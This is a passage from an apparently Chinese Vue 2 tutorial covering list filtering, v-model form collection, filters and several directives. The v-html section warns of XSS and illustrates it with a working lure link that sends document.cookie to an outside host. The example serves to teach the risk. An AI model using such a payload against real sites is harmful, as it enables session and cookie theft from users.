class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span>&#123;&#123;p.name&#125;&#125;--&#123;&#123;p.age&#125;&#125;--&#123;&#123;p.sex&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">keyWord</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">sortType</span>:<span class="number">0</span>,<span class="comment">//0代表原数据，1代表降序  2代表升序</span></span></span><br><span class="line"><span class="javascript">            <span class="attr">persons</span>:[</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">30</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">40</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">25</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">            ],</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">filPersons</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> arr = <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> p.name.indexOf(<span class="built_in">this</span>.keyWord)!==-<span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">                &#125;);</span></span><br><span class="line"><span class="javascript">                <span class="comment">//判断是否需要排序</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="built_in">this</span>.sortType)&#123;</span></span><br><span class="line"><span class="javascript">                    arr.sort(<span class="function">(<span class="params">p1,p2</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> <span class="built_in">this</span>.sortType===<span class="number">1</span>?p2.age-p1.age:p1.age-p2.age;</span></span><br><span class="line"><span class="javascript">                    &#125;)</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> arr;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="收集表单数据"><a href="#收集表单数据" class="headerlink" title="收集表单数据"></a>收集表单数据</h2><ul><li><p>若<code>&lt;input type=&quot;text&quot;/&gt;</code>,则v-model收集的是value值，用户输入的就是value值</p></li><li><p>若<code>&lt;input type=&quot;radio&quot;/&gt;</code>，则v-model收集的就是value值，且要给标签配置value值</p></li><li><p>若</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;checkbox&quot;/&gt;</span><br></pre></td></tr></table></figure><ul><li>没有配置input的value属性，那么收集的就是checked(勾选or未勾选，bool值)</li><li>若配置了input的value属性：<ul><li>v-model的初始值为非数组，那么收集的是checked</li><li>v-model的初始值为数组，那么收集的就是value组成的数组</li></ul></li></ul></li><li><p>备注：v-model三大修饰符：</p><ul><li>lazy:失去焦点时再收集数据</li><li>number：输入字符串转为有效的数字</li><li>itrm：输入首尾空格过滤</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;dome&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            账号: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;account&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            性别: 男<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span>&gt;</span> 女<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            爱好: 抽烟<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>喝酒<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">checked</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>烫头<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            所属校区: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;region&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> &gt;</span>请选择校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> &gt;</span>黄金校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> &gt;</span>南康校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span> &gt;</span>定南校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            其他信息: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;area&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;clause&quot;</span>&gt;</span>阅读并接受《<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>用户协议<span class="tag">&lt;/<span class="name">a</span>&gt;</span>》</span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">el</span>: <span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">account</span>:<span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">password</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">sex</span>:<span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">hobby</span>:[],</span></span><br><span class="line"><span class="javascript">                    <span class="attr">region</span>: <span class="string">&quot;0&quot;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">area</span>:<span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">clause</span>: <span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="javascript">                    </span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">dome</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.account);</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.password);                    </span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.sex);                    </span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.hobby);                    </span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.region);                    </span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.area);                    </span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.clause);                    </span></span></span><br><span class="line"><span class="javascript">                    </span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(<span class="built_in">this</span>._data));       </span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">                </span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">watch</span>:&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">            </span></span><br><span class="line"><span class="javascript">        &#125;);</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><ul><li>定义：对要显示的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)</li><li>语法：<ul><li>注册处理器:<code>Vue.filter(name,callback)</code>或<code>new Vue&#123;filters:&#123;&#125;&#125;</code></li></ul></li><li>备注<ul><li>过滤器也可以接收额外参数，多个过滤器也可以串联</li><li>并没有改变原本的数据，是产生新的对应的数据</li></ul></li><li>用法：<ul><li>过滤器可以作用在插值语法和v-bind</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>显示格式化后的时间&#123;&#123;fmtTime2&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在时间是: &#123;&#123;time&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        过滤器写: &#123;&#123;time | timeFormater&#125;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span><br><span class="line">        过滤器写: &#123;&#123;time | timeFormater | mySlice&#125;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 全局过滤器</span></span></span><br><span class="line"><span class="javascript">    Vue.filter(<span class="string">&quot;mySlice&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> value.slice(<span class="number">0</span>,<span class="number">4</span>);</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">    Vue.filter(<span class="string">&quot;timeFormater&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">time</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> dayjs(time).format(<span class="string">&#x27;YYYY年-MM月-DD日 HH:mm:ss&#x27;</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">time</span>: <span class="built_in">Date</span>.now()</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;,<span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">fmtTime2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY年-MM月-DD日 HH:mm:ss&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;, </span></span><br><span class="line"><span class="javascript">        </span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>:<span class="string">&quot;#root2&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">time</span>: <span class="built_in">Date</span>.now()</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="指令-1"><a href="#指令-1" class="headerlink" title="指令"></a>指令</h1><h2 id="v-text指令"><a href="#v-text指令" class="headerlink" title="v-text指令"></a>v-text指令</h2><p>v-text会将内容当做普遍文本输出到元</p><p>v-text会替换开闭标签之间的内容，所以推荐使用插值语法，更加灵活。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">       <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">           <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">name</span>: <span class="string">&#x27;hhh&#x27;</span>        </span></span><br><span class="line"><span class="javascript">           &#125;</span></span><br><span class="line"><span class="javascript">       &#125;,</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-html指令"><a href="#v-html指令" class="headerlink" title="v-html指令"></a>v-html指令</h2><ul><li>作用：向指定结点中渲染包含html结构的内容</li><li>与插值语法的区别：<ul><li>v-html会替换掉节点中所有的内容，则不会</li><li>v-html可以识别html结构</li></ul></li><li>严重注意：v-html有安全性问题<ul><li>在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击</li><li>一定要在可信的内容上使用v-html</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-html</span>=<span class="string">&quot;str2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">    var vm = new Vue(&#123;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        el: &#x27;#app&#x27;,</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        data: &#123;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">            str:&#x27;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hello,Word<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&#x27;,</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">            str2:&#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:location.href</span>=<span class="string">&quot;http://www.cezzz.top?&quot;</span>+<span class="attr">document.cookie</span>&gt;</span>找到你要的资源了，快点击!!!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        &#125;,</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        methods: &#123;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        &#125;,</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">    &#125;);</span></span></span><br><span class="line"><span class="xml"><span class="handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-cloak指令"><a href="#v-cloak指令" class="headerlink" title="v-cloak指令"></a>v-cloak指令</h2><ul><li>v-cloak指令(没有值)：<ul><li>本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性</li><li>使用css配合v-cloak可以解决网速慢时页面展示出的问题，当Vue接管时会自动删除v-cloak</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 选中所有标签中含v-cloak属性的元素 */</span></span></span><br><span class="line"><span class="css">        <span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>:none;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span 